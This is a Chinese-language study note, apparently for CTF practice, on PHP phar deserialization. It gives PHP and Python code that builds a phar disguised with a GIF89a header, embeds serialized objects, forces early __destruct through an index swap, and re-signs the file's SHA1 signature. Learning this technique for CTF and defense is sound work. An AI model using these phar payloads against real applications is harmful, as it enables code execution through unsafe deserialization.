# 介绍
	- phar 类似于压缩包，但除了文件之外，phar 还包含一个被序列化的对象。
	  当我们用`phar://phar.gif/test.txt`访问 phar 文件`phar.gif`内的文件时，插入其中的对象会被反序列化，并会在之后被销毁（也就是会执行`__destruct()`）。
- # .phar 文件格式
	- [文档](https://www.php.net/manual/en/phar.fileformat.php)
	- 1. `phar`文件头的识别格式是`xxx` + `<?php __HALT_COMPILER(); ?>`，只有这样的格式才能被识别为`phar`文件
	  2. `phar`是压缩文件，那么压缩文件的信息就会存在第二段**manifest describing**，这一段是放序列化的`poc`
	  3. 压缩的文件的内容被存在第三段，也就是上面 payload 的中的`text.txt`
	  4. 数字签名为该`phar`的第四段
	- Phar文件支持gzip压缩等压缩格式，即使压缩成了`phar.phar.gz`之类的格式也能正常读写。
		- [参考](https://www.anquanke.com/post/id/240007#h2-5)
	- 如何修改数字签名
		- 这里的数字签名仅是md5,sha1等哈希算法对前面部分的哈希
		- 其中具体使用什么哈希算法可以参照[这里](https://www.php.net/manual/en/phar.fileformat.signature.php)对比结尾得知
		- 在修改了前面一部分之后可以这么重新签名
			- ```python
			  def sha1_hash(s):
			      sha1_obj = hashlib.sha1()
			      sha1_obj.update(s)
			      return sha1_obj.digest()
			  with open("test/phar.phar", "rb") as f:
			      content = f.read()
			      # content = content.replace(b"i:1;i:114514;", b"i:0;i:114514;")
			      print(content)
			      content = content[:-28] + sha1_hash(content[:-28]) + content[-8:]
			      print(content)
			      with open("modified.phar", "wb") as out:
			          out.write(content)
			  ```
- # Phar上的快速触发GC
	- 普通的快速触发GC：将对象放入一个array中，在后面加入一个数字，然后将`i:1`（数字的下标）改成`i:0`（对象的下标）即可
	- Phar上操作类似，只不过需要重新产生签名
		- ```php
		  $o = new getflag();
		  $o = [$o, 114514];
		  //打开phar文件
		  @unlink("phar.phar");
		  $phar = new Phar("phar.phar"); //生成时后缀名必须为phar
		  $phar->startBuffering();
		  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
		  
		  //放入对象
		  $phar->setMetadata($o);
		  
		  //添加压缩的文件（test为其中的内容）
		  $phar->addFromString("test.txt", "test114514");
		  $phar->stopBuffering();
		  
		  ```
		- ```python
		  def sha1_hash(s):
		      sha1_obj = hashlib.sha1()
		      sha1_obj.update(s)
		      return sha1_obj.digest()
		  # 打开上方PHP生成的phar文件
		  with open("test/phar.phar", "rb") as f:
		      content = f.read()
		      assert content[-8] == 2 # sha1
		      content = content.replace(b"i:1;i:114514;", b"i:0;i:114514;")
		      print(content)
		      content = content[:-28] + sha1_hash(content[:-28]) + content[-8:]
		      print(content)
		      with open("modified.phar", "wb") as out:
		          out.write(content)
		  ```
	-
- # 生成 Phar 文件
	- ```php
	  <?php
	  //反序列化payload构造
	  class TestObject {
	  }
	  $o = new TestObject();
	  $o->data='just a test';
	  //打开phar文件
	  @unlink("phar.phar");
	  $phar = new Phar("phar.phar"); //生成时后缀名必须为phar
	  $phar->startBuffering();
	  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
	  
	  //放入对象
	  $phar->setMetadata($o);
	  
	  //添加压缩的文件（test为其中的内容）
	  $phar->addFromString("test.txt", "test");
	  $phar->stopBuffering();
	  @system("gzip -f phar.phar");
	  echo 'use phar.phar.gz';
	  ?>
	  ```
- # 利用 Phar 文件
	- ```php
	  <?php
	  	class TestObject{
	          function __destruct(){
	              echo $this->data;
	          }
	  	}
	  
	  	include "phar://phar.phar/test.txt";
	  ?>
	  ```
	  
	  访问`phar://phar.phar`也可以利用
- # 其他
	- https://www.php.net/manual/en/phar.using.intro.php
	- phar 文件中可以塞 PHP 命令
-